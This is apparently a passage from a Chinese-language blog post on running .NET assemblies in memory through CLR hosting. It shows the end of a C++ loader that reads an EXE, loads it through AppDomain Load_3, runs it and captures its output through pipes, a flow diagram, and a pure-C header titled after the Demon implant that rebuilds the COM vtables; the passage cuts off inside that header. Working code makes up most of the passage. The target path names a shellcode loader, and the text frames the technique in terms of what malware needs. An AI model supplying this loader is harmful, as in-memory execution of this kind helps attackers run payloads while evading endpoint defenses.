g_OrigninalStdErr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 关闭写入端句柄</span></span><br><span class="line">    <span class="comment">// 这会向读线程发送 EOF 信号，导致 ReadFile 返回 false，从而结束线程循环</span></span><br><span class="line">    CloseHandle(hPipeWrite);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. 等待读线程结束</span></span><br><span class="line">    <span class="keyword">if</span> (reader.joinable()) &#123;</span><br><span class="line">        reader.join();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10. 清理读取句柄</span></span><br><span class="line">    CloseHandle(hPipeRead);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 配置：要加载的 .NET 程序路径 (请修改为你实际存在的路径)</span></span><br><span class="line">    <span class="keyword">const</span> char* targetAssembly = <span class="string">&quot;D:\\代码\\Vs2022\\TestForC#\\DotnetNoVirtualProtectShellcodeLoader\\bin\\x64\\Debug\\DotnetNoVirtualProtectShellcodeLoader.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟的命令行参数</span></span><br><span class="line">    std::<span class="type">string</span> args = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;[*] Reading assembly from: %s\n&quot;</span>, targetAssembly);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从磁盘读取文件到内存</span></span><br><span class="line">    HANDLE hFile = CreateFileA(targetAssembly, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, <span class="number">0</span>, NULL);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] Error: Could not open file. Error Code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwFileSize = GetFileSize(hFile, NULL);</span><br><span class="line">    std::vector&lt;char&gt; fileBuffer(dwFileSize);</span><br><span class="line">    DWORD lpNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(hFile, fileBuffer.data(), dwFileSize, &amp;lpNumberOfBytesRead, NULL)) &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] Error: Could not read file.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">    std::<span class="type">string</span> assemblyStr(fileBuffer.begin(), fileBuffer.end());</span><br><span class="line">    printf(<span class="string">&quot;[+] Assembly read into memory (%d bytes).\n&quot;</span>, dwFileSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 执行内存加载</span></span><br><span class="line">    printf(<span class="string">&quot;[*] Executing Assembly via CLR Hosting (Anonymous Pipes)...\n\n&quot;</span>);</span><br><span class="line">    printf(<span class="string">&quot;--- CAPTURED OUTPUT START ---\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    std::<span class="type">string</span> response = ExecuteAssemblyWithPipe(assemblyStr, args);</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;%s&quot;</span>, response.c_str());</span><br><span class="line">    printf(<span class="string">&quot;\n--- CAPTURED OUTPUT END ---\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 CLR</span></span><br><span class="line">    <span class="keyword">if</span> (g_Runtime) &#123;</span><br><span class="line">        g_Runtime-&gt;Release();</span><br><span class="line">        g_Runtime = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>); <span class="comment">// 暂停以便查看输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[Main]</span><br><span class="line">|</span><br><span class="line">+-&gt; 读取 EXE 文件到 buffer</span><br><span class="line">|</span><br><span class="line">+-&gt; [ExecuteAssemblyWithPipe]</span><br><span class="line">      |</span><br><span class="line">      +-&gt; [LoadCLR] (初始化 .NET 环境)</span><br><span class="line">      |</span><br><span class="line">      +-&gt; CreatePipe (创建 R/W 管道)</span><br><span class="line">      |</span><br><span class="line">      +-&gt; SetStdHandle (将 StdOut 指向 W 管道)</span><br><span class="line">      |</span><br><span class="line">      +-&gt; 启动 [PipeReaderThread] (后台不断从 R 管道读数据)</span><br><span class="line">      |</span><br><span class="line">      +-&gt; [CallMethod]</span><br><span class="line">      |     |</span><br><span class="line">      |     +-&gt; SafeArrayCreate (数据包转 COM 格式)</span><br><span class="line">      |     +-&gt; AppDomain-&gt;Load_3 (内存加载 Assembly)</span><br><span class="line">      |     +-&gt; MethodInfo-&gt;Invoke_3 (运行 C# Main 函数)</span><br><span class="line">      |           |</span><br><span class="line">      |           +-&gt; C# Console.WriteLine </span><br><span class="line">      |                 | (数据流入管道)</span><br><span class="line">      |                 v</span><br><span class="line">      |               [PipeReaderThread] 捕获数据</span><br><span class="line">      |</span><br><span class="line">      +-&gt; (C# 运行结束返回)</span><br><span class="line">      |</span><br><span class="line">      +-&gt; SetStdHandle (恢复 StdOut)</span><br><span class="line">      +-&gt; CloseHandle(W) (通知读线程结束)</span><br><span class="line">      +-&gt; reader.join()</span><br><span class="line">      |</span><br><span class="line">      +-&gt; 返回 output string</span><br><span class="line">|</span><br><span class="line">+-&gt; 打印结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F11%2F18-16-09-992f2ab6d1f02a4a8b82315c8fd07825-PixPin_2025-12-11_18-16-02-b03ddd.png" alt="PixPin_2025-12-11_18-16-02.png"></p>
+<h1 id="四、纯C版本"><a href="#四、纯C版本" class="headerlink" title="四、纯C版本"></a>四、纯C版本</h1><p>在纯C语言环境下，需手动重建C++的COM接口定义，以便在不依赖微软庞大的SDK头文件的情况下，能够调用 .NET的核心功能。</p>
+<p>COM 接口本质上是一个函数指针数组（虚函数表），调用某个函数实际上是根据<strong>偏移量</strong>去数组里找指针。在C语言中，我们需要先定义Vtbl结构体，这个结构体包含了这个COM接口的所有函数声明，然后再定义一个结构体，这个结构体只包含一个Vtbl结构体指针成员，这样一个典型的COM接口的定义就完成了。就比如ICLRMetaHost结构体，它里面的成员只有ICLRMetaHostVtbl虚函数表（函数指针数组）。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="keyword">struct</span> _ICLRMetaHostVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICLRMetaHost* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(ICLRMetaHost* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(ICLRMetaHost* This);</span><br><span class="line">    <span class="comment">// ICLRMetaHost</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetRuntime)(ICLRMetaHost* This, LPCWSTR pwzVersion, REFIID riid, void** ppRuntime);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetVersionFromFile)(ICLRMetaHost* This, LPCWSTR pwzFilePath, LPWSTR pwzBuffer, DWORD* pcchBuffer);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* EnumerateInstalledRuntimes)(ICLRMetaHost* This, void** ppEnumerator);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* EnumerateLoadedRuntimes)(ICLRMetaHost* This, HANDLE hndProcess, void** ppEnumerator);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* RequestRuntimeLoadedNotification)(ICLRMetaHost* This, RuntimeLoadedCallbackFnPtr pCallbackFunction);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryLegacyV2RuntimeBinding)(ICLRMetaHost* This, REFIID riid, void** ppUnk);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* ExitProcess)(ICLRMetaHost* This, INT32 iExitCode);</span><br><span class="line">&#125; ICLRMetaHostVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _ICLRMetaHost &#123; ICLRMetaHostVtbl* lpVtbl; &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>举一个调用相应接口的函数的<strong>示例</strong>：ICLRMetaHost-&gt;lpVtbl-&gt;GetRuntime(……)</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F12%2F12-40-43-31558a4efb8066a802ff66d556dd7221-PixPin_2025-12-12_12-40-42-2e371d.png" alt="PixPin_2025-12-12_12-40-42.png"></p>
+<p>当然有些COM接口中包含几十甚至上百的函数定义，恶意软件只需要用到其中几个特定的函数（比如 <code>Load_3</code>），为了保证内存偏移量正确，作者必须把不需要的函数也列出来，但为了偷懒和省代码，统一用 <code>DUMMY_METHOD</code> 宏来占位，<strong>只定义“我需要的”</strong>，其他的全部填充掉。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define DUMMY_METHOD(x) HRESULT (STDMETHODCALLTYPE *dummy_##x)(void* This)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F12%2F12-38-05-8bffb859e3ac14fddbfa26ca2fad9f5f-PixPin_2025-12-12_12-38-03-fe3442.png" alt="PixPin_2025-12-12_12-38-03.png"></p>
+<p><strong>clr.h</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">#ifndef DEMON_CLR_H</span><br><span class="line">#define DEMON_CLR_H</span><br><span class="line"></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;oleauto.h&gt; <span class="comment">// 为了 SAFEARRAY 和 BSTR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 BUFFER</span></span><br><span class="line">typedef <span class="keyword">struct</span> _BUFFER &#123;</span><br><span class="line">    void* Buffer;</span><br><span class="line">    unsigned long Length;</span><br><span class="line">&#125; BUFFER, * PBUFFER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体来保存状态</span></span><br><span class="line">typedef <span class="keyword">struct</span> &#123;</span><br><span class="line">    HANDLE hPipeRead;      <span class="comment">// 输入：管道读取句柄</span></span><br><span class="line">    char* outputBuffer;    <span class="comment">// 输出：动态增长的缓冲区</span></span><br><span class="line">    size_t totalBytes;     <span class="comment">// 输出：当前读取的总字节数</span></span><br><span class="line">&#125; PipeContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义状态码</span></span><br><span class="line">#ifndef STATUS_SUCCESS</span><br><span class="line">#define STATUS_SUCCESS  ((NTSTATUS)<span class="number">0x00000000</span>L)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"><span class="comment">// GUID 声明 (Extern)</span></span><br><span class="line">extern <span class="keyword">const</span> GUID xCLSID_CLRMetaHost;</span><br><span class="line">extern <span class="keyword">const</span> GUID xIID_ICLRMetaHost;</span><br><span class="line">extern <span class="keyword">const</span> GUID xIID_ICLRRuntimeInfo;</span><br><span class="line">extern <span class="keyword">const</span> GUID xCLSID_CorRuntimeHost;</span><br><span class="line">extern <span class="keyword">const</span> GUID xIID_ICorRuntimeHost;</span><br><span class="line">extern <span class="keyword">const</span> GUID xIID_AppDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前置声明结构体</span></span><br><span class="line">typedef <span class="keyword">struct</span> _ICLRMetaHost    ICLRMetaHost;</span><br><span class="line">typedef <span class="keyword">struct</span> _ICLRRuntimeInfo ICLRRuntimeInfo;</span><br><span class="line">typedef <span class="keyword">struct</span> _ICorRuntimeHost ICorRuntimeHost;</span><br><span class="line">typedef <span class="keyword">struct</span> _AppDomain       IAppDomain;</span><br><span class="line">typedef <span class="keyword">struct</span> _Assembly        IAssembly;</span><br><span class="line">typedef <span class="keyword">struct</span> _MethodInfo      IMethodInfo;</span><br><span class="line">typedef <span class="keyword">struct</span> _Type            IType;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针别名</span></span><br><span class="line">typedef ICLRMetaHost* PICLRMetaHost;</span><br><span class="line">typedef ICLRRuntimeInfo* PICLRRuntimeInfo;</span><br><span class="line">typedef ICorRuntimeHost* PICorRuntimeHost;</span><br><span class="line">typedef IAppDomain* PAppDomain;</span><br><span class="line">typedef IAssembly* PAssembly;</span><br><span class="line">typedef IMethodInfo* PMethodInfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数指针类型定义</span></span><br><span class="line">typedef HRESULT(__stdcall* CLRCreateInstanceFnPtr)(</span><br><span class="line">    <span class="keyword">const</span> GUID* clsid,</span><br><span class="line">    <span class="keyword">const</span> GUID* riid,</span><br><span class="line">    LPVOID* ppInterface);</span><br><span class="line"></span><br><span class="line">typedef HRESULT(__stdcall* RuntimeLoadedCallbackFnPtr)(</span><br><span class="line">    ICLRRuntimeInfo* pRuntimeInfo,</span><br><span class="line">    void* pfnCallbackThreadSet,</span><br><span class="line">    void* pfnCallbackThreadUnset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// =========================================================</span></span><br><span class="line"><span class="comment">//  纯 C 语言 VTable 定义宏</span></span><br><span class="line"><span class="comment">// =========================================================</span></span><br><span class="line"><span class="comment">// 在 C 语言中，第一个参数必须是 This 指针 (void* 或具体类型*)</span></span><br><span class="line">#define DUMMY_METHOD(x) HRESULT (STDMETHODCALLTYPE *dummy_##x)(void* This)</span><br><span class="line"></span><br><span class="line"><span class="comment">// =========================================================</span></span><br><span class="line"><span class="comment">//  接口定义 (VTable + Struct)</span></span><br><span class="line"><span class="comment">// =========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ICLRMetaHost</span></span><br><span class="line">typedef <span class="keyword">struct</span> _ICLRMetaHostVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICLRMetaHost* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(ICLRMetaHost* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(ICLRMetaHost* This);</span><br><span class="line">    <span class="comment">// ICLRMetaHost</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetRuntime)(ICLRMetaHost* This, LPCWSTR pwzVersion, REFIID riid, void** ppRuntime);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetVersionFromFile)(ICLRMetaHost* This, LPCWSTR pwzFilePath, LPWSTR pwzBuffer, DWORD* pcchBuffer);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* EnumerateInstalledRuntimes)(ICLRMetaHost* This, void** ppEnumerator);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* EnumerateLoadedRuntimes)(ICLRMetaHost* This, HANDLE hndProcess, void** ppEnumerator);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* RequestRuntimeLoadedNotification)(ICLRMetaHost* This, RuntimeLoadedCallbackFnPtr pCallbackFunction);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryLegacyV2RuntimeBinding)(ICLRMetaHost* This, REFIID riid, void** ppUnk);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* ExitProcess)(ICLRMetaHost* This, INT32 iExitCode);</span><br><span class="line">&#125; ICLRMetaHostVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _ICLRMetaHost &#123; ICLRMetaHostVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ICLRRuntimeInfo</span></span><br><span class="line">typedef <span class="keyword">struct</span> _ICLRRuntimeInfoVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICLRRuntimeInfo* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(ICLRRuntimeInfo* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(ICLRRuntimeInfo* This);</span><br><span class="line">    <span class="comment">// ICLRRuntimeInfo</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetVersionString)(ICLRRuntimeInfo* This, LPWSTR pwzBuffer, DWORD* pcchBuffer);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetRuntimeDirectory)(ICLRRuntimeInfo* This, LPWSTR pwzBuffer, DWORD* pcchBuffer);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* IsLoaded)(ICLRRuntimeInfo* This, HANDLE hndProcess, BOOL* pbLoaded);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* LoadErrorString)(ICLRRuntimeInfo* This, UINT iResourceID, LPWSTR pwzBuffer, DWORD* pcchBuffer, LONG iLocaleID);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* LoadLibrary)(ICLRRuntimeInfo* This, LPCWSTR pwzDllName, HMODULE* phndModule);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetProcAddress)(ICLRRuntimeInfo* This, LPCSTR pszProcName, void** ppProc);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetInterface)(ICLRRuntimeInfo* This, <span class="keyword">const</span> GUID* rclsid, REFIID riid, void** ppUnk);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* IsLoadable)(ICLRRuntimeInfo* This, BOOL* pbLoadable);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* SetDefaultStartupFlags)(ICLRRuntimeInfo* This, DWORD dwStartupFlags, LPCWSTR pwzHostConfigFile);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetDefaultStartupFlags)(ICLRRuntimeInfo* This, DWORD* pdwStartupFlags, LPWSTR pwzHostConfigFile, DWORD* pcchHostConfigFile);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* BindAsLegacyV2Runtime)(ICLRRuntimeInfo* This);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* IsStarted)(ICLRRuntimeInfo* This, BOOL* pbStarted, DWORD* pdwStartupFlags);</span><br><span class="line">&#125; ICLRRuntimeInfoVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _ICLRRuntimeInfo &#123; ICLRRuntimeInfoVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ICorRuntimeHost</span></span><br><span class="line">typedef <span class="keyword">struct</span> _ICorRuntimeHostVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICorRuntimeHost* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(ICorRuntimeHost* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(ICorRuntimeHost* This);</span><br><span class="line">    <span class="comment">// ICorRuntimeHost</span></span><br><span class="line">    DUMMY_METHOD(CreateLogicalThreadState);</span><br><span class="line">    DUMMY_METHOD(DeleteLogicalThreadState);</span><br><span class="line">    DUMMY_METHOD(SwitchInLogicalThreadState);</span><br><span class="line">    DUMMY_METHOD(SwitchOutLogicalThreadState);</span><br><span class="line">    DUMMY_METHOD(LocksHeldByLogicalThread);</span><br><span class="line">    DUMMY_METHOD(MapFile);</span><br><span class="line">    DUMMY_METHOD(GetConfiguration);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* Start)(ICorRuntimeHost* This);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* Stop)(ICorRuntimeHost* This);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* CreateDomain)(ICorRuntimeHost* This, LPCWSTR pwzFriendlyName, IUnknown* pIdentityArray, IUnknown** pAppDomain);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* GetDefaultDomain)(ICorRuntimeHost* This, IUnknown** pAppDomain);</span><br><span class="line">    DUMMY_METHOD(EnumDomains);</span><br><span class="line">    DUMMY_METHOD(NextDomain);</span><br><span class="line">    DUMMY_METHOD(CloseEnum);</span><br><span class="line">    DUMMY_METHOD(CreateDomainEx);</span><br><span class="line">    DUMMY_METHOD(CreateDomainSetup);</span><br><span class="line">    DUMMY_METHOD(CreateEvidence);</span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* UnloadDomain)(ICorRuntimeHost* This, IUnknown* pAppDomain);</span><br><span class="line">    DUMMY_METHOD(CurrentDomain);</span><br><span class="line">&#125; ICorRuntimeHostVtbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> _ICorRuntimeHost &#123; ICorRuntimeHostVtbl* lpVtbl; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. IAppDomain</span></span><br><span class="line">typedef <span class="keyword">struct</span> _AppDomainVtbl &#123;</span><br><span class="line">    <span class="comment">// IUnknown</span></span><br><span class="line">    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IAppDomain* This, REFIID riid, void** ppvObject);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* AddRef)(IAppDomain* This);</span><br><span class="line">    ULONG(STDMETHODCALLTYPE* Release)(IAppDomain* This);</span><br><span class="line">    <span class="comment">// IDispatch</span></span><br><span class="line">    DUMMY_METHOD(GetTypeInfoCount);</span><br><span class="line">    DUMMY_METHOD(GetTypeInfo);</span><br><span class="line">    DUMMY_METHOD(GetIDsOfNames);</span><br><span class="line">    DUMMY_METHOD(Invoke);</span><br><span class="line">    <span class="comment">// _AppDomain</span></span><br><span class="line">    DUMMY_METHOD(ToString);</span><br><span class="line">    DUMMY_METHOD(Equals);</span><br><span class="line">    DUMMY_METHOD(GetHashCode);</span><br><span class="line">    DUMMY_METHOD(GetType);</span><br><span class="line">    DUMMY_METHOD(InitializeLifetimeService);</span><br><span class="line">    